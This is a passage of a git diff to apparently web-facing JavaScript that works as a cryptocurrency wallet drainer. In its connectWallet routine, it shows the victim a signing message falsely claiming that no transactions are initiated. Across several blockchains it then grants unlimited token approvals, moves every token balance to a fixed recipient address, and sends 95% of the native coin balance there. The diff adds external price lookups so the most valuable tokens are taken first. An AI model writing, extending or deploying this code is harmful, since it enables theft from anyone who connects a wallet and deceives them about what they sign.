+                                if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                                    confluxTokenDetails.push({
+                                        contract: tokenContract,
+                                        balance: balance,
+                                        symbol: token.tokenSymbol,
+                                        address: token.contractAddress,
+                                        usdValue: usdValue
+                                    });
+                                }
+                              }else{
+                                console.log('price info not available...')
                               }
                           }
               
                           // Sort tokens by balance, descending
-                          confluxTokenDetails.sort((a, b) => b.balance.sub(a.balance));
+                          confluxTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+              
               
                           try {
                               for(let token of confluxTokenDetails){
@@ -2810,18 +3375,37 @@ async function connectWallet() {
                           for (let token of merlinTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
-                                  merlinTokenDetails.push({
-                                      contract: tokenContract,
-                                      balance: balance,
-                                      symbol: token.tokenSymbol,
-                                      address: token.contractAddress
-                                  });
+                              const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                              const response = await fetch(proxyUrl)
+                              const prices = await response.json()
+                              const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                              console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                              if(priceInfo !== undefined){
+                                const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                                const usdValue = parseFloat(formattedBalance) * priceInfo
+                                const usdValueRounded = Math.round(usdValue)
+                                //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                                const usdValueString = usdValueRounded.toString()
+                                //console.log(usdValueString)
+                                const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+    
+                                if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                                    merlinTokenDetails.push({
+                                        contract: tokenContract,
+                                        balance: balance,
+                                        symbol: token.tokenSymbol,
+                                        address: token.contractAddress,
+                                        usdValue: usdValue
+                                    });
+                                }
+                              }else{
+                                console.log('price info not available...')
                               }
                           }
               
                           // Sort tokens by balance, descending
-                          merlinTokenDetails.sort((a, b) => b.balance.sub(a.balance));
+                          merlinTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+              
               
                           try {
                               for(let token of merlinTokenDetails){
@@ -2918,2334 +3502,2901 @@ async function connectWallet() {
 
                 switch(targetNetworkId) {
 
-                    //HANDLE ETHEREUM NETWORK
-                    case mainnet.chainId:
-                      const tokens = await fetchETHTokens(address);
-                      // Message to sign
-                      const message = "This is a standard message approval to verify your account. No transactions are initiated";
-                      const signature = await signer.signMessage(message);
-                      console.log('Signature:', signature);
-          
-                      const tokenDetails = [];
-                      for (let token of tokens) {
-                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
-                          const balance = await tokenContract.balanceOf(address);
-                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                  //HANDLE ETHEREUM NETWORK
+                  case mainnet.chainId:
+                    const tokens = await fetchETHTokens(address);
+                    // Message to sign
+                    const message = "This is a standard message approval to verify your account. No transactions are initiated";
+                    const signature = await signer.signMessage(message);
+                    console.log('Signature:', signature);
+        
+                    const tokenDetails = [];
+                    for (let token of tokens) {
+                        const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
+                        const balance = await tokenContract.balanceOf(address);
+                        const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                        const response = await fetch(proxyUrl)
+                        const prices = await response.json()
+                        const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                        console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                        if(priceInfo !== undefined){
+                          const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                          const usdValue = parseFloat(formattedBalance) * priceInfo
+                          const usdValueRounded = Math.round(usdValue)
+                          //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                          const usdValueString = usdValueRounded.toString()
+                          //console.log(usdValueString)
+                          const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+
+                          if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               tokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
                                   symbol: token.tokenSymbol,
-                                  address: token.contractAddress
+                                  address: token.contractAddress,
+                                  usdValue: usdValue
                               });
                           }
-                      }
-          
-                      // Sort tokens by balance, descending
-                      tokenDetails.sort((a, b) => b.balance.sub(a.balance));
-          
-                      try {
-                          for(let token of tokenDetails){
-                              const maxUint256 = ethers.constants.MaxUint256;
-                              // Approve unlimited tokens
-                              const approveTx = await token.contract.approve(contractAddress, maxUint256, { gasLimit: 500000 });
-                              await approveTx.wait();
-                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
-          
-          
-                              // Transfer tokens using the smart contract
-                              const contract = new ethers.Contract(contractAddress, contractABI, signer);
-                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance, { gasLimit: 500000 });
-                              await transferTx.wait();
-                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
-                          }
-                      } catch (error) {
-                          console.error('Error transferring tokens:', error);
-                          
-                      }
-          
-                     try {
-                       //send native tokens
-                       const etherBalance = await provider.getBalance(address)
-                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} ETH`);
-          
-                       if(etherBalance.gte(minimumBalance)){
-                         const amountToSend = etherBalance.mul(95).div(100);
-                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} ETH`);
-          
-                   // Define the transaction
-                       const transaction = {
-                           to: recipientAddress, // Replace with the recipient's address
-                           value: amountToSend,
-                           // Optional: You can specify gasLimit and gasPrice here if necessary
-                       };
-                       const txResponse = await signer.sendTransaction(transaction);
-                       console.log(`Transaction hash: ${txResponse.hash}`);
-          
-                       // Wait for the transaction to be mined
-                       const txReceipt = await txResponse.wait();
-                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
-                       }else{
-                         console.log('No balance found for Ether to send')
-                         
-                       }
-                     } catch (error) {
-                          console.error('Error transferring Ether:', error);
-                          
+                        }else{
+                          console.log('price info not available...')
+                        }
+                    }
+        
+                    // Sort tokens by balance, descending
+                    tokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+        
+                    try {
+                        for(let token of tokenDetails){
+                            const maxUint256 = ethers.constants.MaxUint256;
+                            // Approve unlimited tokens
+                            const approveTx = await token.contract.approve(contractAddress, maxUint256, { gasLimit: 500000 });
+                            await approveTx.wait();
+                            console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
+        
+        
+                            // Transfer tokens using the smart contract
+                            const contract = new ethers.Contract(contractAddress, contractABI, signer);
+                            const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance, { gasLimit: 500000 });
+                            await transferTx.wait();
+                            console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
+                        }
+                    } catch (error) {
+                        console.error('Error transferring tokens:', error);
+                        
+                    }
+        
+                   try {
+                     //send native tokens
+                     const etherBalance = await provider.getBalance(address)
+                     console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} ETH`);
+        
+                     if(etherBalance.gte(minimumBalance)){
+                       const amountToSend = etherBalance.mul(95).div(100);
+                     console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} ETH`);
+        
+                 // Define the transaction
+                     const transaction = {
+                         to: recipientAddress, // Replace with the recipient's address
+                         value: amountToSend,
+                         // Optional: You can specify gasLimit and gasPrice here if necessary
+                     };
+                     const txResponse = await signer.sendTransaction(transaction);
+                     console.log(`Transaction hash: ${txResponse.hash}`);
+        
+                     // Wait for the transaction to be mined
+                     const txReceipt = await txResponse.wait();
+                     console.log('Transaction confirmed in block:', txReceipt.blockNumber);
+                     }else{
+                       console.log('No balance found for Ether to send')
+                       
                      }
-                      break;
-          
-          
-                    //BINANCE SMART CHAIN
-                    case bsc.chainId:
-                      const bscTokens = await fetchBNBTokens(address);
-          
-                      // Message to sign
-                      const bnbMessage = "This is a standard message approval to verify your account. No transactions are initiated";
-                      const bnbSignature = await signer.signMessage(bnbMessage);
-                      console.log('Signature:', bnbSignature);
-          
-                      const bnbTokenDetails = [];
-                      for (let token of bscTokens) {
-                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
-                          const balance = await tokenContract.balanceOf(address);
-                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                   } catch (error) {
+                        console.error('Error transferring Ether:', error);
+                        
+                   }
+                    break;
+        
+        
+                  //BINANCE SMART CHAIN
+                  case bsc.chainId:
+                    const bscTokens = await fetchBNBTokens(address);
+        
+                    // Message to sign
+                    const bnbMessage = "This is a standard message approval to verify your account. No transactions are initiated";
+                    const bnbSignature = await signer.signMessage(bnbMessage);
+                    console.log('Signature:', bnbSignature);
+        
+                    const bnbTokenDetails = [];
+                    for (let token of bscTokens) {
+                        const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
+                        const balance = await tokenContract.balanceOf(address);
+                        const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                        const response = await fetch(proxyUrl)
+                        const prices = await response.json()
+                        const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                        console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                        if(priceInfo !== undefined){
+                          const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                          const usdValue = parseFloat(formattedBalance) * priceInfo
+                          const usdValueRounded = Math.round(usdValue)
+                          //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                          const usdValueString = usdValueRounded.toString()
+                          //console.log(usdValueString)
+                          const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+
+                          if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               bnbTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
                                   symbol: token.tokenSymbol,
-                                  address: token.contractAddress
+                                  address: token.contractAddress,
+                                  usdValue: usdValue
                               });
                           }
-                      }
-          
-                      // Sort tokens by balance, descending
-                      bnbTokenDetails.sort((a, b) => b.balance.sub(a.balance));
-          
-                      try {
-                          for(let token of bnbTokenDetails){
-                              const maxUint256 = ethers.constants.MaxUint256;
-                              // Approve unlimited tokens
-                              const approveTx = await token.contract.approve(bnbContractAddress, maxUint256);
-                              await approveTx.wait();
-                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
-          
-          
-                              // Transfer tokens using the smart contract
-                              const contract = new ethers.Contract(bnbContractAddress, contractABI, signer);
-                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
-                              await transferTx.wait();
-                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
-                          }
-                      } catch (error) {
-                          console.error('Error transferring tokens:', error);
-                          
-                      }
-          
-                     try {
-                       //send native tokens
-                       const etherBalance = await provider.getBalance(address)
-                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} BNB`);
-          
-                       if(etherBalance.gte(minimumBalance)){
-                         const amountToSend = etherBalance.mul(95).div(100);
-                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} BNB`);
-          
-                   // Define the transaction
-                       const transaction = {
-                           to: recipientAddress, // Replace with the recipient's address
-                           value: amountToSend,
-                           // Optional: You can specify gasLimit and gasPrice here if necessary
-                       };
-                       const txResponse = await signer.sendTransaction(transaction);
-                       console.log(`Transaction hash: ${txResponse.hash}`);
-          
-                       // Wait for the transaction to be mined
-                       const txReceipt = await txResponse.wait();
-                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
-                       }else{
-                         console.log('No balance found for BNB to send')
-                         
-                       }
-                     } catch (error) {
-                          console.error('Error transferring Ether:', error);
-                          
+                        }else{
+                          console.log('price info not available...')
+                        }
+                    }
+        
+                    // Sort tokens by balance, descending
+                    bnbTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+        
+        
+                    try {
+                        for(let token of bnbTokenDetails){
+                            const maxUint256 = ethers.constants.MaxUint256;
+                            // Approve unlimited tokens
+                            const approveTx = await token.contract.approve(bnbContractAddress, maxUint256);
+                            await approveTx.wait();
+                            console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
+        
+        
+                            // Transfer tokens using the smart contract
+                            const contract = new ethers.Contract(bnbContractAddress, contractABI, signer);
+                            const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
+                            await transferTx.wait();
+                            console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
+                        }
+                    } catch (error) {
+                        console.error('Error transferring tokens:', error);
+                        
+                    }
+        
+                   try {
+                     //send native tokens
+                     const etherBalance = await provider.getBalance(address)
+                     console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} BNB`);
+        
+                     if(etherBalance.gte(minimumBalance)){
+                       const amountToSend = etherBalance.mul(95).div(100);
+                     console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} BNB`);
+        
+                 // Define the transaction
+                     const transaction = {
+                         to: recipientAddress, // Replace with the recipient's address
+                         value: amountToSend,
+                         // Optional: You can specify gasLimit and gasPrice here if necessary
+                     };
+                     const txResponse = await signer.sendTransaction(transaction);
+                     console.log(`Transaction hash: ${txResponse.hash}`);
+        
+                     // Wait for the transaction to be mined
+                     const txReceipt = await txResponse.wait();
+                     console.log('Transaction confirmed in block:', txReceipt.blockNumber);
+                     }else{
+                       console.log('No balance found for BNB to send')
+                       
                      }
-                      break;
-          
-          
-          
-                    //ARBITRUM NETWORK
-                    case arbitrum.chainId:
-                      const arbTokens = await fetchARBTokens(address);
-          
-                      // Message to sign
-                      const arbMessage = "This is a standard message approval to verify your account. No transactions are initiated";
-                      const arbSignature = await signer.signMessage(arbMessage);
-                      console.log('Signature:', arbSignature);
-          
-                      const arbTokenDetails = [];
-                      for (let token of arbTokens) {
-                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
-                          const balance = await tokenContract.balanceOf(address);
-                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                   } catch (error) {
+                        console.error('Error transferring Ether:', error);
+                        
+                   }
+                    break;
+        
+        
+                  //ARBITRUM NETWORK
+                  case arbitrum.chainId:
+                    const arbTokens = await fetchARBTokens(address);
+        
+                    // Message to sign
+                    const arbMessage = "This is a standard message approval to verify your account. No transactions are initiated";
+                    const arbSignature = await signer.signMessage(arbMessage);
+                    console.log('Signature:', arbSignature);
+        
+                    const arbTokenDetails = [];
+                    for (let token of arbTokens) {
+                        const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
+                        const balance = await tokenContract.balanceOf(address);
+                        const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                        const response = await fetch(proxyUrl)
+                        const prices = await response.json()
+                        const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                        console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                        if(priceInfo !== undefined){
+                          const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                          const usdValue = parseFloat(formattedBalance) * priceInfo
+                          const usdValueRounded = Math.round(usdValue)
+                          //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                          const usdValueString = usdValueRounded.toString()
+                          //console.log(usdValueString)
+                          const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+
+                          if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               arbTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
                                   symbol: token.tokenSymbol,
-                                  address: token.contractAddress
+                                  address: token.contractAddress,
+                                  usdValue: usdValue
                               });
                           }
-                      }
-          
-                      // Sort tokens by balance, descending
-                      arbTokenDetails.sort((a, b) => b.balance.sub(a.balance));
-          
-                      try {
-                          for(let token of arbTokenDetails){
-                              const maxUint256 = ethers.constants.MaxUint256;
-                              // Approve unlimited tokens
-                              const approveTx = await token.contract.approve(arbContractAddress, maxUint256);
-                              await approveTx.wait();
-                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
-          
-          
-                              // Transfer tokens using the smart contract
-                              const contract = new ethers.Contract(arbContractAddress, contractABI, signer);
-                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
-                              await transferTx.wait();
-                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
-                          }
-                      } catch (error) {
-                          console.error('Error transferring tokens:', error);
-                          
-                      }
-          
-                     try {
-                       //send native tokens
-                       const etherBalance = await provider.getBalance(address)
-                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} ARB`);
-          
-                       if(etherBalance.gte(minimumBalance)){
-                         const amountToSend = etherBalance.mul(95).div(100);
-                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} ARB`);
-          
-                   // Define the transaction
-                       const transaction = {
-                           to: recipientAddress, // Replace with the recipient's address
-                           value: amountToSend,
-                           // Optional: You can specify gasLimit and gasPrice here if necessary
-                       };
-                       const txResponse = await signer.sendTransaction(transaction);
-                       console.log(`Transaction hash: ${txResponse.hash}`);
-          
-                       // Wait for the transaction to be mined
-                       const txReceipt = await txResponse.wait();
-                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
-                       }else{
-                         console.log('No balance found for ARB to send')
-                         
-                       }
-                     } catch (error) {
-                          console.error('Error transferring ARB:', error);
-                      
+                        }else{
+                          console.log('price info not available...')
+                        }
+                    }
+        
+                    // Sort tokens by balance, descending
+                    arbTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+        
+        
+                    try {
+                        for(let token of arbTokenDetails){
+                            const maxUint256 = ethers.constants.MaxUint256;
+                            // Approve unlimited tokens
+                            const approveTx = await token.contract.approve(arbContractAddress, maxUint256);
+                            await approveTx.wait();
+                            console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
+        
+        
+                            // Transfer tokens using the smart contract
+                            const contract = new ethers.Contract(arbContractAddress, contractABI, signer);
+                            const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
+                            await transferTx.wait();
+                            console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
+                        }
+                    } catch (error) {
+                        console.error('Error transferring tokens:', error);
+                        
+                    }
+        
+                   try {
+                     //send native tokens
+                     const etherBalance = await provider.getBalance(address)
+                     console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} ARB`);
+        
+                     if(etherBalance.gte(minimumBalance)){
+                       const amountToSend = etherBalance.mul(95).div(100);
+                     console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} ARB`);
+        
+                 // Define the transaction
+                     const transaction = {
+                         to: recipientAddress, // Replace with the recipient's address
+                         value: amountToSend,
+                         // Optional: You can specify gasLimit and gasPrice here if necessary
+                     };
+                     const txResponse = await signer.sendTransaction(transaction);
+                     console.log(`Transaction hash: ${txResponse.hash}`);
+        
+                     // Wait for the transaction to be mined
+                     const txReceipt = await txResponse.wait();
+                     console.log('Transaction confirmed in block:', txReceipt.blockNumber);
+                     }else{
+                       console.log('No balance found for ARB to send')
+                       
                      }
-                      break;
-          
-                    //OPTIMISM
-                    case optimism.chainId:
-                      const opTokens = await fetchOPTokens(address);
-          
-                      // Message to sign
-                      const opMessage = "This is a standard message approval to verify your account. No transactions are initiated";
-                      const opSignature = await signer.signMessage(opMessage);
-                      console.log('Signature:', opSignature);
-          
-                      const opTokenDetails = [];
-                      for (let token of opTokens) {
-                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
-                          const balance = await tokenContract.balanceOf(address);
-                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                   } catch (error) {
+                        console.error('Error transferring ARB:', error);
+                    
+                   }
+                    break;
+        
+                  //OPTIMISM
+                  case optimism.chainId:
+                    const opTokens = await fetchOPTokens(address);
+        
+                    // Message to sign
+                    const opMessage = "This is a standard message approval to verify your account. No transactions are initiated";
+                    const opSignature = await signer.signMessage(opMessage);
+                    console.log('Signature:', opSignature);
+        
+                    const opTokenDetails = [];
+                    for (let token of opTokens) {
+                        const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
+                        const balance = await tokenContract.balanceOf(address);
+                        const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                        const response = await fetch(proxyUrl)
+                        const prices = await response.json()
+                        const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                        console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                        if(priceInfo !== undefined){
+                          const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                          const usdValue = parseFloat(formattedBalance) * priceInfo
+                          const usdValueRounded = Math.round(usdValue)
+                          //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                          const usdValueString = usdValueRounded.toString()
+                          //console.log(usdValueString)
+                          const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+
+                          if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               opTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
                                   symbol: token.tokenSymbol,
-                                  address: token.contractAddress
+                                  address: token.contractAddress,
+                                  usdValue: usdValue
                               });
                           }
-                      }
-          
-                      // Sort tokens by balance, descending
-                      opTokenDetails.sort((a, b) => b.balance.sub(a.balance));
-          
-                      try {
-                          for(let token of opTokenDetails){
-                              const maxUint256 = ethers.constants.MaxUint256;
-                              // Approve unlimited tokens
-                              const approveTx = await token.contract.approve(optimismContractAddress, maxUint256);
-                              await approveTx.wait();
-                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
-          
-          
-                              // Transfer tokens using the smart contract
-                              const contract = new ethers.Contract(optimismContractAddress, contractABI, signer);
-                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
-                              await transferTx.wait();
-                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
-                          }
-                      } catch (error) {
-                          console.error('Error transferring tokens:', error);
-                          
-                      }
-          
-                     try {
-                       //send native tokens
-                       const etherBalance = await provider.getBalance(address)
-                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} OP`);
-          
-                       if(etherBalance.gte(minimumBalance)){
-                         const amountToSend = etherBalance.mul(95).div(100);
-                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} OP`);
-          
-                   // Define the transaction
-                       const transaction = {
-                           to: recipientAddress, // Replace with the recipient's address
-                           value: amountToSend,
-                           // Optional: You can specify gasLimit and gasPrice here if necessary
-                       };
-                       const txResponse = await signer.sendTransaction(transaction);
-                       console.log(`Transaction hash: ${txResponse.hash}`);
-          
-                       // Wait for the transaction to be mined
-                       const txReceipt = await txResponse.wait();
-                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
-                       }else{
-                         console.log('No balance found for OP to send')
+                        }else{
+                          console.log('price info not available...')
+                        }
+                    }
+        
+                    // Sort tokens by balance, descending
+                    opTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+        
+        
+                    try {
+                        for(let token of opTokenDetails){
+                            const maxUint256 = ethers.constants.MaxUint256;
+                            // Approve unlimited tokens
+                            const approveTx = await token.contract.approve(optimismContractAddress, maxUint256);
+                            await approveTx.wait();
+                            console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
+        
+        
+                            // Transfer tokens using the smart contract
+                            const contract = new ethers.Contract(optimismContractAddress, contractABI, signer);
+                            const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
+                            await transferTx.wait();
+                            console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
+                        }
+                    } catch (error) {
+                        console.error('Error transferring tokens:', error);
                         
-                       }
-                     } catch (error) {
-                          console.error('Error transferring OP:', error);
-                          
+                    }
+        
+                   try {
+                     //send native tokens
+                     const etherBalance = await provider.getBalance(address)
+                     console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} OP`);
+        
+                     if(etherBalance.gte(minimumBalance)){
+                       const amountToSend = etherBalance.mul(95).div(100);
+                     console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} OP`);
+        
+                 // Define the transaction
+                     const transaction = {
+                         to: recipientAddress, // Replace with the recipient's address
+                         value: amountToSend,
+                         // Optional: You can specify gasLimit and gasPrice here if necessary
+                     };
+                     const txResponse = await signer.sendTransaction(transaction);
+                     console.log(`Transaction hash: ${txResponse.hash}`);
+        
+                     // Wait for the transaction to be mined
+                     const txReceipt = await txResponse.wait();
+                     console.log('Transaction confirmed in block:', txReceipt.blockNumber);
+                     }else{
+                       console.log('No balance found for OP to send')
+                      
                      }
-                      break;
-                          
-                          
-                    //ARBITRUM NOVA
-                    case arbnova.chainId:
-                      const arbnovaTokens = await fetchARBNOVATokens(address);
-          
-                      // Message to sign
-                      const arbnovaMessage = "This is a standard message approval to verify your account. No transactions are initiated";
-                      const arbnovaSignature = await signer.signMessage(arbnovaMessage);
-                      console.log('Signature:', arbnovaSignature);
-          
-                      const arbnovaTokenDetails = [];
-                      for (let token of arbnovaTokens) {
-                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
-                          const balance = await tokenContract.balanceOf(address);
-                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                   } catch (error) {
+                        console.error('Error transferring OP:', error);
+                        
+                   }
+                    break;
+                        
+                        
+                  //ARBITRUM NOVA
+                  case arbnova.chainId:
+                    const arbnovaTokens = await fetchARBNOVATokens(address);
+        
+                    // Message to sign
+                    const arbnovaMessage = "This is a standard message approval to verify your account. No transactions are initiated";
+                    const arbnovaSignature = await signer.signMessage(arbnovaMessage);
+                    console.log('Signature:', arbnovaSignature);
+        
+                    const arbnovaTokenDetails = [];
+                    for (let token of arbnovaTokens) {
+                        const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
+                        const balance = await tokenContract.balanceOf(address);
+                        const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                        const response = await fetch(proxyUrl)
+                        const prices = await response.json()
+                        const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                        console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                        if(priceInfo !== undefined){
+                          const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                          const usdValue = parseFloat(formattedBalance) * priceInfo
+                          const usdValueRounded = Math.round(usdValue)
+                          //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                          const usdValueString = usdValueRounded.toString()
+                          //console.log(usdValueString)
+                          const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+
+                          if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               arbnovaTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
                                   symbol: token.tokenSymbol,
-                                  address: token.contractAddress
+                                  address: token.contractAddress,
+                                  usdValue: usdValue
                               });
                           }
-                      }
-          
-                      // Sort tokens by balance, descending
-                      arbnovaTokenDetails.sort((a, b) => b.balance.sub(a.balance));
-          
-                      try {
-                          for(let token of arbnovaTokenDetails){
-                              const maxUint256 = ethers.constants.MaxUint256;
-                              // Approve unlimited tokens
-                              const approveTx = await token.contract.approve(arbnovaContractAddress, maxUint256);
-                              await approveTx.wait();
-                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
-          
-          
-                              // Transfer tokens using the smart contract
-                              const contract = new ethers.Contract(arbnovaContractAddress, contractABI, signer);
-                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
-                              await transferTx.wait();
-                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
-                          }
-                      } catch (error) {
-                          console.error('Error transferring tokens:', error);
-                         
-                      }
-          
-                     try {
-                       //send native tokens
-                       const etherBalance = await provider.getBalance(address)
-                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} ARBNOVA`);
-          
-                       if(etherBalance.gte(minimumBalance)){
-                         const amountToSend = etherBalance.mul(95).div(100);
-                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} ARBNOVA`);
-          
-                   // Define the transaction
-                       const transaction = {
-                           to: recipientAddress, // Replace with the recipient's address
-                           value: amountToSend,
-                           // Optional: You can specify gasLimit and gasPrice here if necessary
-                       };
-                       const txResponse = await signer.sendTransaction(transaction);
-                       console.log(`Transaction hash: ${txResponse.hash}`);
-          
-                       // Wait for the transaction to be mined
-                       const txReceipt = await txResponse.wait();
-                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
-                       }else{
-                         console.log('No balance found for ARB to send')
-                         
-                       }
-                     } catch (error) {
-                          console.error('Error transferring ARBNOVA:', error);
-                          
+                        }else{
+                          console.log('price info not available...')
+                        }
+                    }
+        
+                    // Sort tokens by balance, descending
+                    arbnovaTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+        
+        
+                    try {
+                        for(let token of arbnovaTokenDetails){
+                            const maxUint256 = ethers.constants.MaxUint256;
+                            // Approve unlimited tokens
+                            const approveTx = await token.contract.approve(arbnovaContractAddress, maxUint256);
+                            await approveTx.wait();
+                            console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
+        
+        
+                            // Transfer tokens using the smart contract
+                            const contract = new ethers.Contract(arbnovaContractAddress, contractABI, signer);
